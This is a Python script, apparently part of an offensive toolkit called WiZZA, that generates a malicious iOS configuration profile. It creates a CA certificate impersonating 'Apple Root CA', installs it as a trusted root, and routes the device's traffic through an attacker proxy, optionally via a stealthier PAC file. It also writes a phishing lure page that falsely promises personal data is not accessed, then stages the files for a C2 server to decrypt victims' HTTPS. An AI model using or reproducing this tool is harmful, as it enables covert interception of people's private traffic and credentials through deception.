#!/usr/bin/env python3
"""
WiZZA iOS MDM Profile Generator
Generates a .mobileconfig file that:
  1. Installs a custom CA certificate on the device
  2. Once installed, WiZZA's MitM proxy can decrypt ALL HTTPS from that device
  3. Optionally configures a proxy (auto-config or manual) to route traffic through attacker

Usage: python3 ios_mdm_gen.py --host <c2_host> --port <proxy_port> --out <output.mobileconfig>
"""

import argparse
import base64
import os
import sys
import uuid
import subprocess
import tempfile
from datetime import datetime

# ── Certificate generation ─────────────────────────────────────────────
def gen_ca_cert(out_dir: str) -> tuple[str, str]:
    """Generate a self-signed CA cert + key using openssl."""
    key_path  = os.path.join(out_dir, "wizza_ca.key")
    cert_path = os.path.join(out_dir, "wizza_ca.crt")
    der_path  = os.path.join(out_dir, "wizza_ca.der")

    if not os.path.exists(cert_path):
        # Generate CA key + self-signed cert
        subprocess.run([
            "openssl", "req", "-newkey", "rsa:2048", "-nodes",
            "-keyout", key_path,
            "-x509", "-days", "3650",
            "-out",  cert_path,
            "-subj", "/C=US/ST=CA/L=San Francisco/O=Apple Inc./OU=Certificate Authority/CN=Apple Root CA"
        ], check=True, capture_output=True)

        # Convert to DER (required for mobileconfig)
        subprocess.run([
            "openssl", "x509", "-in", cert_path, "-outform", "DER", "-out", der_path
        ], check=True, capture_output=True)

    with open(der_path, "rb") as f:
        cert_der_b64 = base64.b64encode(f.read()).decode()

    return cert_path, cert_der_b64


# ── .mobileconfig XML builder ──────────────────────────────────────────
def build_profile(
    org_name:     str,
    display_name: str,
    description:  str,
    cert_b64:     str,
    proxy_host:   str = "",
    proxy_port:   int = 8080,
    pac_url:      str = "",
    include_wifi_proxy: bool = True,
) -> str:
    profile_id   = str(uuid.uuid4()).upper()
    cert_uuid    = str(uuid.uuid4()).upper()
    proxy_uuid   = str(uuid.uuid4()).upper()
    wifi_uuid    = str(uuid.uuid4()).upper()

    payload_content = []

    # ── 1. CA Certificate payload ──────────────────────────────────────
    payload_content.append(f"""
    <dict>
        <key>PayloadType</key>       <string>com.apple.security.root</string>
        <key>PayloadVersion</key>    <integer>1</integer>
        <key>PayloadIdentifier</key> <string>com.apple.security.root.{cert_uuid}</string>
        <key>PayloadUUID</key>       <string>{cert_uuid}</string>
        <key>PayloadDisplayName</key><string>Security Certificate</string>
        <key>PayloadDescription</key><string>Installs a trusted root certificate</string>
        <key>PayloadOrganization</key><string>{org_name}</string>
        <key>PayloadContent</key>
        <data>{cert_b64}</data>
    </dict>""")

    # ── 2. HTTP proxy payload (routes all traffic through attacker) ────
    if proxy_host or pac_url:
        if pac_url:
            # PAC-based (automatic proxy config — stealthier)
            payload_content.append(f"""
    <dict>
        <key>PayloadType</key>       <string>com.apple.proxy.http.global</string>
        <key>PayloadVersion</key>    <integer>1</integer>
        <key>PayloadIdentifier</key> <string>com.apple.proxy.{proxy_uuid}</string>
        <key>PayloadUUID</key>       <string>{proxy_uuid}</string>
        <key>PayloadDisplayName</key><string>Network Proxy</string>
        <key>PayloadOrganization</key><string>{org_name}</string>
        <key>ProxyType</key>         <string>Auto</string>
        <key>ProxyPACURL</key>       <string>{pac_url}</string>
    </dict>""")
        else:
            payload_content.append(f"""
    <dict>
        <key>PayloadType</key>       <string>com.apple.proxy.http.global</string>
        <key>PayloadVersion</key>    <integer>1</integer>
        <key>PayloadIdentifier</key> <string>com.apple.proxy.{proxy_uuid}</string>
        <key>PayloadUUID</key>       <string>{proxy_uuid}</string>
        <key>PayloadDisplayName</key><string>Network Proxy</string>
        <key>PayloadOrganization</key><string>{org_name}</string>
        <key>ProxyType</key>         <string>Manual</string>
        <key>HTTPEnable</key>        <true/>
        <key>HTTPProxy</key>         <string>{proxy_host}</string>
        <key>HTTPPort</key>          <integer>{proxy_port}</integer>
        <key>HTTPSEnable</key>       <true/>
        <key>HTTPSProxy</key>        <string>{proxy_host}</string>
        <key>HTTPSPort</key>         <integer>{proxy_port}</integer>
    </dict>""")

    content_xml = "\n".join(payload_content)

    profile = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadDisplayName</key>    <string>{display_name}</string>
    <key>PayloadDescription</key>    <string>{description}</string>
    <key>PayloadOrganization</key>   <string>{org_name}</string>
    <key>PayloadIdentifier</key>     <string>com.wizza.profile.{profile_id}</string>
    <key>PayloadUUID</key>           <string>{profile_id}</string>
    <key>PayloadType</key>           <string>Configuration</string>
    <key>PayloadVersion</key>        <integer>1</integer>
    <key>PayloadRemovalDisallowed</key> <false/>
    <key>PayloadContent</key>
    <array>{content_xml}
    </array>
</dict>
</plist>
"""
    return profile


# ── Generate PAC file (hosted on attacker C2) ─────────────────────────
def build_pac(proxy_host: str, proxy_port: int) -> str:
    return f"""function FindProxyForURL(url, host) {{
    // Bypass localhost
    if (isPlainHostName(host) || host === "localhost" || host === "127.0.0.1")
        return "DIRECT";
    // Route everything else through WiZZA proxy
    return "PROXY {proxy_host}:{proxy_port}; DIRECT";
}}
"""


# ── Delivery HTML page ─────────────────────────────────────────────────
def build_lure_page(profile_url: str, org_name: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Update Required</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
    background: #f2f2f7; min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
  }}
  .card {{
    background: white; border-radius: 16px; padding: 32px 28px;
    max-width: 380px; width: 90%; text-align: center;
    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
  }}
  .icon {{ font-size: 56px; margin-bottom: 16px; }}
  h1 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; margin-bottom: 8px; }}
  p  {{ font-size: 14px; color: #636366; line-height: 1.5; margin-bottom: 24px; }}
  .btn {{
    display: block; width: 100%; padding: 14px;
    background: #007aff; color: white; border: none;
    border-radius: 12px; font-size: 16px; font-weight: 600;
    cursor: pointer; text-decoration: none; margin-bottom: 10px;
  }}
  .btn:active {{ background: #0062cc; }}
  .btn.secondary {{ background: #f2f2f7; color: #007aff; }}
  .steps {{ text-align: left; margin: 20px 0; }}
  .step {{ display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; font-size: 13px; color: #3a3a3c; }}
  .step-num {{ background: #007aff; color: white; border-radius: 50%; width: 22px; height: 22px;
               display: flex; align-items: center; justify-content: center; font-size: 12px;
               font-weight: 600; flex-shrink: 0; margin-top: 1px; }}
  .note {{ font-size: 12px; color: #8e8e93; margin-top: 16px; }}
</style>
</head>
<body>
<div class="card">
  <div class="icon">🔐</div>
  <h1>Security Profile Required</h1>
  <p>{org_name} requires you to install a security certificate to access internal resources on this network.</p>

  <div class="steps">
    <div class="step">
      <div class="step-num">1</div>
      <div>Tap <strong>Install Profile</strong> below</div>
    </div>
    <div class="step">
      <div class="step-num">2</div>
      <div>When prompted, tap <strong>Allow</strong> then <strong>Install</strong></div>
    </div>
    <div class="step">
      <div class="step-num">3</div>
      <div>Go to <strong>Settings → General → VPN & Device Management</strong> and trust the profile</div>
    </div>
    <div class="step">
      <div class="step-num">4</div>
      <div>Go to <strong>Settings → General → About → Certificate Trust Settings</strong> and enable full trust</div>
    </div>
  </div>

  <a class="btn" href="{profile_url}">Install Profile</a>
  <p class="note">This profile will be used only for corporate network security. Your personal data is not accessed.</p>
</div>
</body>
</html>
"""


# ── Main ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="WiZZA iOS MDM Profile Generator")
    parser.add_argument("--host",     required=True,  help="Attacker/proxy host (e.g. 192.168.1.100 or c2.example.com)")
    parser.add_argument("--port",     default=8080,   type=int, help="Proxy port (default 8080)")
    parser.add_argument("--out",      default="/tmp", help="Output directory")
    parser.add_argument("--org",      default="IT Security Team", help="Organization name shown to victim")
    parser.add_argument("--name",     default="Corporate Security Profile", help="Profile display name")
    parser.add_argument("--pac",      action="store_true", help="Use PAC-based proxy (stealthier)")
    parser.add_argument("--cert-only",action="store_true", help="Only install CA cert, no proxy config")
    parser.add_argument("--ca-dir",   default=os.path.expanduser("~/.wizza"), help="Dir to store CA key/cert")
    args = parser.parse_args()

    os.makedirs(args.out,    exist_ok=True)
    os.makedirs(args.ca_dir, exist_ok=True)

    print(f"\n  [*] WiZZA iOS MDM Generator")
    print(f"  [*] Proxy: {args.host}:{args.port}")

    # Check openssl
    if subprocess.run(["which", "openssl"], capture_output=True).returncode != 0:
        print("  [-] openssl not found — install: apt install openssl")
        sys.exit(1)

    # Generate CA
    print("  [*] Generating CA certificate...")
    ca_cert_path, ca_der_b64 = gen_ca_cert(args.ca_dir)
    print(f"  [+] CA cert: {ca_cert_path}")

    # Proxy config
    proxy_host = "" if args.cert_only else args.host
    pac_url    = ""
    if args.pac and not args.cert_only:
        pac_url = f"https://{args.host}/m/proxy.pac"

    # Build profile
    profile_xml = build_profile(
        org_name     = args.org,
        display_name = args.name,
        description  = f"Required by {args.org} for secure network access",
        cert_b64     = ca_der_b64,
        proxy_host   = proxy_host,
        proxy_port   = args.port,
        pac_url      = pac_url,
    )

    # Write profile
    profile_path = os.path.join(args.out, "wizza_profile.mobileconfig")
    with open(profile_path, "w") as f:
        f.write(profile_xml)
    print(f"  [+] MDM profile: {profile_path}")

    # Write PAC file
    if args.pac and not args.cert_only:
        pac_path = os.path.join(args.out, "proxy.pac")
        with open(pac_path, "w") as f:
            f.write(build_pac(args.host, args.port))
        print(f"  [+] PAC file: {pac_path}")

    # Write lure page
    lure_path = os.path.join(args.out, "ios_lure.html")
    profile_url = f"https://{args.host}/m/ios"
    with open(lure_path, "w") as f:
        f.write(build_lure_page(profile_url, args.org))
    print(f"  [+] Lure page: {lure_path}")

    # Summary
    print(f"""
  ┌─────────────────────────────────────────────────────────┐
  │  iOS MDM Profile Ready                                  │
  ├─────────────────────────────────────────────────────────┤
  │  Profile:   {profile_path:<42} │
  │  CA cert:   {ca_cert_path:<42} │
  │  Serve at:  https://{args.host}/m/ios{'':<28} │
  ├─────────────────────────────────────────────────────────┤
  │  After victim installs:                                 │
  │  • All HTTPS traffic decryptable by WiZZA MitM proxy   │
  │  • Start MitM:  start mitm                             │
  │  • Configure mitmproxy with CA key: {os.path.join(args.ca_dir, 'wizza_ca.key'):<14} │
  └─────────────────────────────────────────────────────────┘
""")

    # Copy profile + lure to payloads dir for C2 to serve
    payloads_dir = os.path.expanduser("~/.wizza/payloads")
    os.makedirs(payloads_dir, exist_ok=True)
    import shutil
    shutil.copy(profile_path, os.path.join(payloads_dir, "wizza_profile.mobileconfig"))
    if args.pac and not args.cert_only:
        shutil.copy(pac_path, os.path.join(payloads_dir, "proxy.pac"))
    shutil.copy(lure_path, os.path.join(payloads_dir, "ios_lure.html"))
    print(f"  [+] Files copied to {payloads_dir} — C2 will serve them at /m/*")


if __name__ == "__main__":
    main()
